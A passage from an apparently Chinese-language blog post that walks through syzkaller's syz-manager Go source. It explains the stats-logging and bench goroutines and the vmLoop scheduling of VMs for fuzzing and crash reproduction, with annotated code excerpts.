创建【日志输出】协程</h3><p>接下来会新起一个协程进行数据记录的工作，内部其实就是一个<strong>每 10s 进行一次进度采集并输出日志的无限循环</strong>，主要是采集执行信息、语料覆盖率、crashes 信息等：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> lastTime := time.Now(); ; &#123;<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br>now := time.Now()<br>diff := now.Sub(lastTime)<br>lastTime = now<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.fuzzingTime += diff * time.Duration(atomic.LoadUint32(&amp;mgr.numFuzzing))<br>executed := mgr.stats.execTotal.get()<br>crashes := mgr.stats.crashes.get()<br>corpusCover := mgr.stats.corpusCover.get()<br>corpusSignal := mgr.stats.corpusSignal.get()<br>maxSignal := mgr.stats.maxSignal.get()<br>mgr.mu.Unlock()<br>numReproducing := atomic.LoadUint32(&amp;mgr.numReproducing)<br>numFuzzing := atomic.LoadUint32(&amp;mgr.numFuzzing)<br><br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;VMs %v, executed %v, cover %v, signal %v/%v, crashes %v, repro %v&quot;</span>,<br>numFuzzing, executed, corpusCover, corpusSignal, maxSignal, crashes, numReproducing)<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><h3 id="Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）"><a href="#Step-5-创建-bench-协程（每隔一分钟最小化语料库并将-bench-data-写入-bench-文件）" class="headerlink" title="Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）"></a>Step 5. 创建 bench 协程（每隔一分钟最小化语料库并将 bench data 写入 bench 文件）</h3><p>这里会判断命令行传入参数是否有 <code>bench=</code>，若是则调用 <code>initBench()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> *flagBench != <span class="hljs-string">&quot;&quot;</span> &#123;<br>mgr.initBench()<br>&#125;<br></code></pre></td></tr></table></figure><p> 这里的 <code>flagBench</code> 是一个全局的 flag 变量，golang 提供了一个 <code>flag</code> 包用以处理命令行参数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> (<br>flagConfig = flag.String(<span class="hljs-string">&quot;config&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;configuration file&quot;</span>)<br>flagDebug  = flag.Bool(<span class="hljs-string">&quot;debug&quot;</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;dump all VM output to console&quot;</span>)<br>flagBench  = flag.String(<span class="hljs-string">&quot;bench&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;write execution statistics into this file periodically&quot;</span>)<br>)<br></code></pre></td></tr></table></figure><p><code>initBench()</code> 会启动一个协程，主要就是一个每隔一分钟运行一次的循环：</p><ul><li>调用 <code>minimizeCorpus()</code> 将语料库进行最小化</li><li>向 <code>bench</code> 参数指定的文件当中写入 <code>语料库长度、启动时间、fuzzing 时间\n</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> initBench() &#123;<br>f, err := os.OpenFile(*flagBench, os.O_WRONLY|os.O_CREATE|os.O_EXCL, osutil.DefaultFilePerm)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to open bench file: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> &#123;<br>time.Sleep(time.Minute)<br>vals := mgr.stats.all()<br>mgr.mu.Lock()<br><span class="hljs-keyword">if</span> mgr.firstConnect.IsZero() &#123;<br>mgr.mu.Unlock()<br><span class="hljs-keyword">continue</span><br>&#125;<br>mgr.minimizeCorpus()<br>vals[<span class="hljs-string">&quot;corpus&quot;</span>] = <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(mgr.corpus))<br>vals[<span class="hljs-string">&quot;uptime&quot;</span>] = <span class="hljs-type">uint64</span>(time.Since(mgr.firstConnect)) / <span class="hljs-number">1e9</span><br>vals[<span class="hljs-string">&quot;fuzzing&quot;</span>] = <span class="hljs-type">uint64</span>(mgr.fuzzingTime) / <span class="hljs-number">1e9</span><br>mgr.mu.Unlock()<br><br>data, err := json.MarshalIndent(vals, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;  &quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to serialize bench data&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> _, err := f.Write(<span class="hljs-built_in">append</span>(data, <span class="hljs-string">&#x27;\n&#x27;</span>)); err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;failed to write bench data&quot;</span>)<br>&#125;<br>&#125;<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-6-启动-dashboard-协程，进入下一阶段"><a href="#Step-6-启动-dashboard-协程，进入下一阶段" class="headerlink" title="Step 6. 启动 dashboard 协程，进入下一阶段"></a>Step 6. 启动 dashboard 协程，进入下一阶段</h3><p>接下来会启动一个新的协程，主要是 <em>每隔一分钟上报一次 syz-manager 的状态，这里不再展开</em> ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> mgr.dash != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">go</span> mgr.dashboardReporter()<br>&#125;<br></code></pre></td></tr></table></figure><p>最后会简单检查一下 VM Pool ，随后调用 <code>vmLoop()</code> 进入下一阶段：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go">osutil.HandleInterrupts(vm.Shutdown)<br><span class="hljs-keyword">if</span> mgr.vmPool == <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;no VMs started (type=none)&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;you are supposed to start syz-fuzzer manually as:&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;syz-fuzzer -manager=manager.ip:%v [other flags as necessary]&quot;</span>, mgr.serv.port)<br>&lt;-vm.Shutdown<br><span class="hljs-keyword">return</span><br>&#125;<br>mgr.vmLoop()<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="0x04-vmLoop-：启动-fuzzing，管控整体流程"><a href="#0x04-vmLoop-：启动-fuzzing，管控整体流程" class="headerlink" title="0x04. vmLoop()：启动 fuzzing，管控整体流程"></a>0x04. vmLoop()：启动 fuzzing，管控整体流程</h1><h2 id="一、VM-分组，初始化资源池等变量"><a href="#一、VM-分组，初始化资源池等变量" class="headerlink" title="一、VM 分组，初始化资源池等变量"></a>一、VM 分组，初始化资源池等变量</h2><p>一开始首先会将所有的 VM 分为两组：一组负责 fuzzing，一组负责复现 crash （<code>maxReproVMs</code>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Manager needs to be refactored (#605).</span><br><span class="hljs-comment">// nolint: gocyclo, gocognit, funlen</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> vmLoop() &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;booting test machines...&quot;</span>)<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;wait for the connection from test machine...&quot;</span>)<br>instancesPerRepro := <span class="hljs-number">4</span><br>vmCount := mgr.vmPool.Count()<br>maxReproVMs := vmCount - mgr.cfg.FuzzingVMs<br><span class="hljs-keyword">if</span> instancesPerRepro &gt; maxReproVMs &amp;&amp; maxReproVMs &gt; <span class="hljs-number">0</span> &#123;<br>instancesPerRepro = maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>随后会调用 <code>SequentialResourcePool()</code> 新建一个 <code>ResourcePool</code> 队列，主要负责对<strong>空闲 VM 使用顺序</strong>的调控 ：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go">instances := SequentialResourcePool(vmCount, <span class="hljs-number">10</span>*time.Second*mgr.cfg.Timeouts.Scale)<br></code></pre></td></tr></table></figure><p>接下来会初始化一系列的变量：</p><ul><li><code>runDone</code>：保存 fuzzing 结果为 crash 的 <strong>Crash 队列</strong></li><li><code>pendingRepro</code>：标识<strong>待复现的 Crash</strong></li><li><code>reproducing</code>：标识<strong>某个类型 Crash</strong> 是否准备被复现</li><li><code>reproQueue</code>：Crash 的复现队列</li><li><code>reproDone</code>：Crash 的复现结果</li><li><code>stopPending</code>：等待停止标志位</li><li><code>shutdown</code>：工作终止标志位</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go">runDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *RunResult, <span class="hljs-number">1</span>)<br>pendingRepro := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Crash]<span class="hljs-type">bool</span>)<br>reproducing := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> reproQueue []*Crash<br>reproDone := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *ReproResult, <span class="hljs-number">1</span>)<br>stopPending := <span class="hljs-literal">false</span><br>shutdown := vm.Shutdown<br></code></pre></td></tr></table></figure><p>最后进入到一个大循环中，这个大循环才是真正的 fuzzing 调控流程</p><h2 id="二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据"><a href="#二、外层大循环：调配空闲-VM-进行-fuzz-amp-crash-repro，等待处理不同-channel-数据" class="headerlink" title="二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据"></a>二、外层大循环：调配空闲 VM 进行 fuzz &amp; crash repro，等待处理不同 channel 数据</h2><p>大循环的终止条件为 <code>shutdown == nil</code> 或是 ResourcePool 中的 VM 数量与总数量不相等，进入循环后首先会获取当前所在阶段： </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> shutdown != <span class="hljs-literal">nil</span> || instances.Len() != vmCount &#123;<br>mgr.mu.Lock()<br>phase := mgr.phase<br>mgr.mu.Unlock()<br></code></pre></td></tr></table></figure><h3 id="Step-1-内层小循环：获取待复现-crash-加入复现队列"><a href="#Step-1-内层小循环：获取待复现-crash-加入复现队列" class="headerlink" title="Step 1. 内层小循环：获取待复现 crash 加入复现队列"></a>Step 1. 内层小循环：获取待复现 crash 加入复现队列</h3><p>小循环会遍历 <code>pendingRepro</code> 中的 crash：</p><ul><li>若未被复现则从 pendingRepro 中删除</li><li>调用 <code>needRepro()</code> 检查是否需要复现</li><li>标记该标题的 crash 已在复现，并加入复现队列中</li></ul><p>这里的 <code>crash.Title</code> 其实是 <strong>Oops 的第一行文本，</strong>即<strong>同一时刻仅会复现同类 crash 中的一个</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> crash := <span class="hljs-keyword">range</span> pendingRepro &#123;<br><span class="hljs-keyword">if</span> reproducing[crash.Title] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-built_in">delete</span>(pendingRepro, crash)<br><span class="hljs-keyword">if</span> !mgr.needRepro(crash) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: add to repro queue &#x27;%v&#x27;&quot;</span>, crash.Title)<br>reproducing[crash.Title] = <span class="hljs-literal">true</span><br>reproQueue = <span class="hljs-built_in">append</span>(reproQueue, crash)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="Step-2-判断是否可以对-crash-进行复现并调控-VM"><a href="#Step-2-判断是否可以对-crash-进行复现并调控-VM" class="headerlink" title="Step 2. 判断是否可以对 crash 进行复现并调控 VM"></a>Step 2. 判断是否可以对 crash 进行复现并调控 VM</h3><p>接下来会输出一行日志，之后定义一个闭包函数 <code>canRepro</code>，用来判断<strong>当前是否可以进行 crash 复现</strong>，主要判断以下三个条件是否满足：</p><ul><li>当前阶段是否超过 <code>phaseTriagedHub</code> </li><li>待复现队列 <code>reproQueue</code> 是否不为空</li><li>加上该 crash 后所有用来复现 crash 的 VM 数量是否小于 <code>maxReproVMs</code></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go">log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: phase=%v shutdown=%v instances=%v/%v %+v repro: pending=%v reproducing=%v queued=%v&quot;</span>,<br>phase, shutdown == <span class="hljs-literal">nil</span>, instances.Len(), vmCount, instances.Snapshot(),<br><span class="hljs-built_in">len</span>(pendingRepro), <span class="hljs-built_in">len</span>(reproducing), <span class="hljs-built_in">len</span>(reproQueue))<br><br>canRepro := <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> phase &gt;= phaseTriagedHub &amp;&amp; <span class="hljs-built_in">len</span>(reproQueue) != <span class="hljs-number">0</span> &amp;&amp;<br>(<span class="hljs-type">int</span>(atomic.LoadUint32(&amp;mgr.numReproducing))+<span class="hljs-number">1</span>)*instancesPerRepro &lt;= maxReproVMs<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来是两个小循环：</p><h4 id="①-循环启动协程调度-VM-进行-crash-复现"><a href="#①-循环启动协程调度-VM-进行-crash-复现" class="headerlink" title="① 循环启动协程调度 VM 进行 crash 复现"></a>① 循环启动协程调度 VM 进行 crash 复现</h4><p>第一个小循环会循环判断是否可以进行 crash 复现：</p><ul><li>若可以复现则从资源池队列中取出一个 VM idx，若资源池为空则直接跳出</li><li>从 <code>reproQueue</code> 中取出一个 crash，更新 manager 的 <code>numReproducing</code> 计数</li><li>启动一个新的协程调用 <code>runRepro()</code> 对该 crash 进行复现，结果输出至 <code>reproDone</code> 队列中</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> shutdown != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">for</span> canRepro() &#123;<br>vmIndexes := instances.Take(instancesPerRepro)<br><span class="hljs-keyword">if</span> vmIndexes == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>last := <span class="hljs-built_in">len</span>(reproQueue) - <span class="hljs-number">1</span><br>crash := reproQueue[last]<br>reproQueue[last] = <span class="hljs-literal">nil</span><br>reproQueue = reproQueue[:last]<br>atomic.AddUint32(&amp;mgr.numReproducing, <span class="hljs-number">1</span>)<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: starting repro of &#x27;%v&#x27; on instances %+v&quot;</span>, crash.Title, vmIndexes)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>reproDone &lt;- mgr.runRepro(crash, vmIndexes, instances.Put)<br>&#125;()<br>&#125;<br></code></pre></td></tr></table></figure><p> 而 <code>runRepro()</code> 其实就是 <code>repro.Run()</code> 的 wrapper ＋ 一些错误检查后将 VM idx 放回资源池，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(mgr *Manager)</span></span> runRepro(crash *Crash, vmIndexes []<span class="hljs-type">int</span>, putInstances <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(...<span class="hljs-type">int</span>)</span></span>) *ReproResult &#123;<br>features := mgr.checkResult.Features<br>res, stats, err := repro.Run(crash.Output, mgr.cfg, features, mgr.reporter, mgr.vmPool, vmIndexes)<br>    <span class="hljs-comment">//...</span><br></code></pre></td></tr></table></figure><p><code>Run()</code> 一开始主要是一些检查，之后根据 crash 类型的不同设置不同的复现时间上限：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Run</span><span class="hljs-params">(crashLog []<span class="hljs-type">byte</span>, cfg *mgrconfig.Config, features *host.Features, reporter *report.Reporter,</span></span><br><span class="hljs-params"><span class="hljs-function">vmPool *vm.Pool, vmIndexes []<span class="hljs-type">int</span>)</span></span> (*Result, *Stats, <span class="hljs-type">error</span>) &#123;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(vmIndexes) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;no VMs provided&quot;</span>)<br>&#125;<br>entries := cfg.Target.ParseLog(crashLog)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(entries) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;crash log does not contain any programs&quot;</span>)<br>&#125;<br>crashStart := <span class="hljs-built_in">len</span>(crashLog)<br>crashTitle, crashType := <span class="hljs-string">&quot;&quot;</span>, report.Unknown<br><span class="hljs-keyword">if</span> rep := reporter.Parse(crashLog); rep != <span class="hljs-literal">nil</span> &#123;<br>crashStart = rep.StartPos<br>crashTitle = rep.Title<br>crashType = rep.Type<br>&#125;<br>testTimeouts := []time.Duration&#123;<br><span class="hljs-number">3</span> * cfg.Timeouts.Program, <span class="hljs-comment">// 以捕获更简单的 crashes (即 no races and no hangs)</span><br><span class="hljs-number">20</span> * cfg.Timeouts.Program,<br>cfg.Timeouts.NoOutputRunningTime, <span class="hljs-comment">// 以捕获 &quot;no output&quot;, races and hangs</span><br>&#125;<br><span class="hljs-keyword">switch</span> &#123;<br><span class="hljs-keyword">case</span> crashTitle == <span class="hljs-string">&quot;&quot;</span>:<br>crashTitle = <span class="hljs-string">&quot;no output/lost connection&quot;</span><br><span class="hljs-comment">// Lost connection 可以被更快地检测到,</span><br><span class="hljs-comment">// 但理论上若其由竞争造成，则可能需要最长的 timeout.</span><br><span class="hljs-comment">// No output 仅能在最大的 timeout 下被复现.</span><br><span class="hljs-comment">// 作为妥协，我们使用最小与最大的 timeouts.</span><br>testTimeouts = []time.Duration&#123;testTimeouts[<span class="hljs-number">0</span>], testTimeouts[<span class="hljs-number">2</span>]&#125;<br><span class="hljs-keyword">case</span> crashType == report.MemoryLeak:<br><span class="hljs-comment">// 由于昂贵的设置与扫描，内存泄露不能被很快地检测到.</span><br>testTimeouts = testTimeouts[<span class="hljs-number">1</span>:]<br><span class="hljs-keyword">case</span> crashType == report.Hang:<br>testTimeouts = testTimeouts[<span class="hljs-number">2</span>:]<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来会将崩溃信息存储到一个 <code>context</code> 结构体中，并新建一个 WaitGroup：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs go">ctx := &amp;context&#123;<br>target:       cfg.SysTarget,<br>reporter:     reporter,<br>crashTitle:   crashTitle,<br>crashType:    crashType,<br>instances:    <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> *reproInstance, <span class="hljs-built_in">len</span>(vmIndexes)),<br>bootRequests: <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>, <span class="hljs-built_in">len</span>(vmIndexes)),<br>testTimeouts: testTimeouts,<br>startOpts:    createStartOptions(cfg, features, crashType),<br>stats:        <span class="hljs-built_in">new</span>(Stats),<br>timeouts:     cfg.Timeouts,<br>&#125;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;%v programs, %v VMs, timeouts %v&quot;</span>, <span class="hljs-built_in">len</span>(entries), <span class="hljs-built_in">len</span>(vmIndexes), testTimeouts)<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br>wg.Add(<span class="hljs-built_in">len</span>(vmIndexes))<br></code></pre></td></tr></table></figure><p>随后循环获取用以复现的 VM idx 并依次启动新协程调用 <code>CreateExecProgInstance()</code> <strong>创建 VM 并拷贝 crash 程序</strong>，若失败则休眠 10s 后重试，最多会尝试 <code>maxTry</code> 次；成功的结果会输出到 <code>ctx.instances</code> 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, vmIndex := <span class="hljs-keyword">range</span> vmIndexes &#123;<br>ctx.bootRequests &lt;- vmIndex<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">defer</span> wg.Done()<br><span class="hljs-keyword">for</span> vmIndex := <span class="hljs-keyword">range</span> ctx.bootRequests &#123;<br><span class="hljs-keyword">var</span> inst *instance.ExecProgInstance<br>maxTry := <span class="hljs-number">3</span><br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; try &lt; maxTry; try++ &#123;<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-vm.Shutdown:<br>try = maxTry<br><span class="hljs-keyword">continue</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst, err = instance.CreateExecProgInstance(vmPool, vmIndex, cfg,<br>reporter, &amp;instance.OptionalConfig&#123;Logf: ctx.reproLogf&#125;)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>ctx.reproLogf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;failed to init instance: %v&quot;</span>, err)<br>time.Sleep(<span class="hljs-number">10</span> * time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> inst == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br>ctx.instances &lt;- &amp;reproInstance&#123;execProg: inst, index: vmIndex&#125;<br>&#125;<br>&#125;()<br>&#125;<br><span class="hljs-comment">// 一些收尾工作...</span><br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>wg.Wait()<br><span class="hljs-built_in">close</span>(ctx.instances)<br>&#125;()<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-built_in">close</span>(ctx.bootRequests)<br><span class="hljs-keyword">for</span> inst := <span class="hljs-keyword">range</span> ctx.instances &#123;<br>inst.execProg.VMInstance.Close()<br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p><code>CreateExecProgInstance()</code> 主要就是调用 <code>vmPool.Create()</code> 启动虚拟机后调用 <code>SetupExecProg()</code> 拷贝要执行的二进制文件，这里就不展开了：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">CreateExecProgInstance</span><span class="hljs-params">(vmPool *vm.Pool, vmIndex <span class="hljs-type">int</span>, mgrCfg *mgrconfig.Config,</span></span><br><span class="hljs-params"><span class="hljs-function">reporter *report.Reporter, opt 